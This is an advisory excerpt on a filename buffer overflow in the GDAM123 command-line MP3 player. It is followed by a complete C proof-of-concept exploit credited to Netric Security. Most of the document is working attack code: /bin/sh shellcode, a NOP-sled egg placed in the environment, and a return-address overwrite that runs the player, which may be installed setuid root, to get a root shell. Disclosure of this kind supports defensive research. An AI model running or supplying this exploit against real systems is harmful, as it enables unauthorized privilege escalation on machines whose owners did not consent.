source: http://www.securityfocus.com/bid/5578/info

The GDAM123 command-line MP3 player is prone to a buffer overflow condition when handling overly long filenames. Under some circumstances, the player may be installed setuid root to allow unprivileged users to run the player if access to certain devices is required. In a situation such as this, the buffer overflow may be exploited to gain elevated privileges via the execution of arbitrary code. 

/* gdam123(client) proof of concept exploit by sacrine
 * An unchecked buffer in filename option
 * Netric Security (RESOURCE MATERIAL)
 * http://www.netric.org
 *
 * ./gdam123-expl -3300
 * greets: All members of Netric, my girlfriend
 */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

// #define BUFLEN	2148
#define BUFLEN	(2157 + 9) 
#define NOP	0x90

char shellcode[] =
       "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
       "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
       "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char **argv)
{
	unsigned long ret = 0xbffff090;
	char 	buffer[BUFLEN];
	char 	egg[1024];
	char	*ptr;
	int	i=0;
	unsigned long offset ; 

	if (argc > 1) 
		ret = ret - atol(argv[1]) ;

	memset(buffer,NOP,sizeof(buffer));
	ptr=egg;
	
	for (i=0; i<1024-strlen(shellcode)-1;i++)*(ptr++) = '\x90';
	for (i=0; i<strlen(shellcode);i++)*(ptr++) = shellcode[i];
	
	egg[1024-1] = '\0';
	memcpy(egg,"EGG=",4);
	putenv(egg);
	
	memset(buffer, 0x41, sizeof(buffer)); 
	buffer[BUFLEN-5] = (ret & 0x000000ff);
	buffer[BUFLEN-4] = (ret & 0x0000ff00) >> 8;
	buffer[BUFLEN-3] = (ret & 0x00ff0000) >> 16;
	buffer[BUFLEN-2] = (ret & 0xff000000) >> 24;
	buffer[BUFLEN-1] = 0x00;
	
	printf("gdam123 proof of concept exploit by sacrine\n");
	printf("ret: 0x%x\n",ret);
	printf("buf: %d\n\n",strlen(buffer));
	
	execl("gdam123", "gdam123_hacked",buffer, NULL);
	return(0);
}